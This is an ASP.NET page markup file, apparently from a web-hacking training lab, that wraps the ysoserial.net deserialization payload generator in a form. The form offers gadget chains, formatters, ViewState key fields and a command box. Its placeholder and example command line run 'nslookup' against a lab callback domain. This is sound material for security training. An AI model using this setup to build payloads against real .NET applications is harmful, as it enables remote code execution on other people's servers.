<%@ Page Title="ysoserial.net" Language="C#" MasterPageFile="~/Site.Master" AutoEventWireup="true" CodeBehind="YSoSerial.aspx.cs" Inherits="WebWrapper.YSoSerial" %>

<asp:Content ID="BodyContent" ContentPlaceHolderID="MainContent" runat="server">

    <div class="container-fluid">
        <div class="row">
            <div class="col-md-12">
                <div class="page-header">
                    <h1><a href="https://github.com/pwntester/ysoserial.net"><%: Title %> </a></h1>
                    <br />
                    <p>Deserialization payload generator for a variety of .NET formatters</p>
                </div>
                <div class="row">
                    <div class="col-md-6">
                        <div class="form-group">
                            <label for="dropDownPlugins">Plugins</label>
                            <asp:DropDownList ID="dropDownPlugins" CssClass="form-control"  AutoPostBack="true" runat="server" OnSelectedIndexChanged="dropDownPlugins_SelectedIndexChanged">
                                <asp:ListItem>Generic</asp:ListItem>
                                <asp:ListItem>ViewState</asp:ListItem>
                            </asp:DropDownList>
                        </div>
                        <div class="form-group">
                            <label for="dropdownGadget">Gadget</label>
                            <asp:DropDownList ID="dropdownGadget" CssClass="form-control" runat="server">
                                <asp:ListItem Selected="True">TypeConfuseDelegate</asp:ListItem>
                                <asp:ListItem>ActivitySurrogateSelectorFromFile</asp:ListItem>
                                <asp:ListItem>ActivitySurrogateSelector</asp:ListItem>
                                <asp:ListItem>ObjectDataProvider</asp:ListItem>
                                <asp:ListItem>PSObject</asp:ListItem>
                                <asp:ListItem>WindowsIdentity</asp:ListItem>
                            </asp:DropDownList>
                        </div>
                        <div class="form-group">
                            <asp:Label ID="labelDownFormatter" runat="server" Text="Formatter" Font-Bold="true"></asp:Label>
                            <asp:DropDownList ID="dropDownFormatter" CssClass="form-control" runat="server">
                                <asp:ListItem>BinaryFormatter</asp:ListItem>
                                <asp:ListItem>ObjectStateFormatter</asp:ListItem>
                                <asp:ListItem>SoapFormatter</asp:ListItem>
                                <asp:ListItem>LosFormatter</asp:ListItem>
                                <asp:ListItem>Xaml</asp:ListItem>
                                <asp:ListItem>Json.Net</asp:ListItem>
                                <asp:ListItem>FastJson</asp:ListItem>
                                <asp:ListItem>JavaScriptSerializer</asp:ListItem>
                                <asp:ListItem>XmlSerializer</asp:ListItem>
                                <asp:ListItem>DataContractSerializer</asp:ListItem>
                                <asp:ListItem>YamlDotNet</asp:ListItem>
                                <asp:ListItem>NetDataContractSerializer</asp:ListItem>
                            </asp:DropDownList>
                        </div>
                        <div class="form-group">
                            <asp:Label ID="labelAspNetVersion" runat="server" Text="Asp.Net Version" Font-Bold="true"></asp:Label>
                            <asp:DropDownList ID="dropdownAspNetVersion" AutoPostBack="true" CssClass="form-control" runat="server" OnSelectedIndexChanged="dropdownAspNetVersion_SelectedIndexChanged">
                                <asp:ListItem>Asp.Net < 4.5</asp:ListItem>
                                <asp:ListItem>Asp.Net >= 4.5</asp:ListItem>
                            </asp:DropDownList>
                        </div>
                        <div class="form-group">
                            <asp:Label ID="labelValdiationAlgo" runat="server" Text="Validation Algorithm" Font-Bold="true"></asp:Label>
                            <asp:DropDownList ID="dropdownValdiationAlgo" CssClass="form-control" runat="server">
                                <asp:ListItem>SHA1</asp:ListItem>
                                <asp:ListItem>HMACSHA256</asp:ListItem>
                                <asp:ListItem>HMACSHA384</asp:ListItem>
                                <asp:ListItem>HMACSHA512</asp:ListItem>
                            </asp:DropDownList>
                        </div>
                        <div class="form-group">
                            <asp:Label ID="labelValidationKey" runat="server" Text="Validation Key" Font-Bold="true"></asp:Label>
                            <asp:TextBox ID="txtValidationKey" runat="server" CssClass="form-control"></asp:TextBox>
                        </div>
                        <div class="form-group">
                            <asp:Label ID="labelDecryptionAlgo" runat="server" Text="Decryption Algorithm" Font-Bold="true"></asp:Label>
                            <asp:DropDownList ID="dropdownDecryptionAlgo" CssClass="form-control" runat="server">
                                <asp:ListItem>AES</asp:ListItem>
                                <asp:ListItem>DES</asp:ListItem>
                            </asp:DropDownList>
                        </div>
                        <div class="form-group">
                            <asp:Label ID="labelDecryptionKey" runat="server" Text="Decryption Key" Font-Bold="true"></asp:Label>
                            <asp:TextBox ID="txtDecryptionKey" runat="server" CssClass="form-control"></asp:TextBox>
                        </div>
                        <div class="form-group">
                            <asp:Label ID="labelGenerator" runat="server" Text="Generator" Font-Bold="true"></asp:Label>
                            <asp:TextBox ID="txtGenerator" runat="server" CssClass="form-control"></asp:TextBox>
                        </div>
                        <div class="form-group">
                            <asp:Label ID="lableTaragetPagePath" runat="server" Text="Target page path" Font-Bold="true"></asp:Label>
                            <asp:TextBox ID="txtTargetPagePath" runat="server" CssClass="form-control"></asp:TextBox>
                        </div>
                        <div class="form-group">
                            <asp:Label ID="labelIISPath" runat="server" Text="Application path in IIS" Font-Bold="true"></asp:Label>
                            <asp:TextBox ID="txtAppPathInIIS" runat="server" CssClass="form-control"></asp:TextBox>
                        </div>
                        <!--<div class="form-group">
                            <label for="dropdownOutput">Output Type</label>
                            <asp:DropDownList ID="dropdownOutput" CssClass="form-control" runat="server">
                                <asp:ListItem>Base64</asp:ListItem>
                                <asp:ListItem>Raw</asp:ListItem>
                            </asp:DropDownList>
                        </div>-->
                        <div class="form-group">
                            <label for="txtCommand">Command:</label>
                            <asp:TextBox ID="txtCommand" CssClass="form-control" placeholder="nslookup foo.userx.webhacklab.com" runat="server" TextMode="MultiLine" required></asp:TextBox>
                        </div>
                        <asp:Button ID="btnSubmit" runat="server" CssClass="btn btn-danger btn-lg" Text="Generate" OnClick="btnSubmit_Click" />
                    </div>
                    <div class="col-md-6">
                        <div class="form-group">
                            <label for="txtOutput">Output Data:</label>
                            <asp:TextBox ID="txtOutput" runat="server" CssClass="form-control" ReadOnly="true" Height="400px" Width="565px" TextMode="MultiLine"></asp:TextBox>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="row">
            <hr />
            <div class="alert alert-success" role="alert">
                <asp:Label ID="lblYSoSerialCommand" runat="server" Text="ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o Base64 -c 'nslookup foo.userx.webhacklab.com'" Style="word-wrap: break-word;"></asp:Label>
            </div>
        </div>
    </div>
</asp:Content>
